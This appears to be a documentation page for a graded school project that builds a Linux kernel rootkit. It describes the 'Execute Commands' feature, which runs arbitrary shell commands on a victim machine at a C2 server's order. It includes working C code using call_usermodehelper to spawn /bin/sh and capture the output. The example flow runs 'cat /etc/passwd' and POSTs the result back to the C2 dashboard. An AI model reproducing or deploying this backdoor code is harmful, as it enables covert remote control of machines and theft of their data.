---
title: Execute Commands
description: Run arbitrary shell commands on the victim from the C2 dashboard. stdout, stderr and exit code are returned.
---

**Mandatory · 5 pts**

Run arbitrary shell commands on the victim from the C2 dashboard. `stdout`, `stderr`, and exit code are returned.

## How it works

When the C2 sends an `exec:<cmd>` action, the rootkit calls `exec_command()` which uses `call_usermodehelper()` — the kernel API for spawning userland processes from kernel context. The command is wrapped in a shell one-liner that redirects output to temporary files in `/rootkit/`, since kernel threads have no access to stdio.

After the shell exits (`UMH_WAIT_PROC`), the rootkit reads back stdout, stderr, and the exit code from the temp files, then POSTs all three to `/api/<uuid>/result`.

## Implementation

```c
// rootkit/src/exec.c : exec_command()

int exec_command(const char *cmd, char *stdout_buf, ..., int *exit_code)
{
    // Build: cmd >stdout 2>stderr; echo $? >exitcode
    snprintf(sh_cmd, 4096,
             "%s > /rootkit/stdout 2> /rootkit/stderr"
             " ; echo $? > /rootkit/exitcode", cmd);

    char *argv[] = { "/bin/sh", "-c", sh_cmd, NULL };
    char *envp[] = { "HOME=/",
                     "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

    sub_info = call_usermodehelper_setup(argv[0], argv, envp,
                                         GFP_KERNEL, NULL, NULL, NULL);

    // UMH_WAIT_PROC: block the kthread until /bin/sh exits
    call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);

    // Read results back from temp files
    read_file("/rootkit/exitcode", exitcode_buf, sizeof(exitcode_buf));
    *exit_code = simple_strtol(exitcode_buf, NULL, 10);
    read_file("/rootkit/stdout",   stdout_buf, stdout_max);
    read_file("/rootkit/stderr",   stderr_buf, stderr_max);
}
```

:::tip[Why temp files?]
Kernel threads have no file descriptors and no access to stdio. `call_usermodehelper()` runs the process without any attached terminal. Redirecting through files in `/rootkit/` is the standard pattern for capturing subprocess output from kernel space.
:::

## Flow

1. C2 sends `200 OK` with body `exec:cat /etc/passwd`
2. Rootkit builds: `cat /etc/passwd > /rootkit/stdout 2> /rootkit/stderr; echo $? > /rootkit/exitcode`
3. `call_usermodehelper("/bin/sh", UMH_WAIT_PROC)` — blocks until shell exits
4. Rootkit reads back the three temp files
5. `POST /api/<uuid>/result` with `exit_code`, `stdout`, `stderr`
6. Result appears in the C2 dashboard
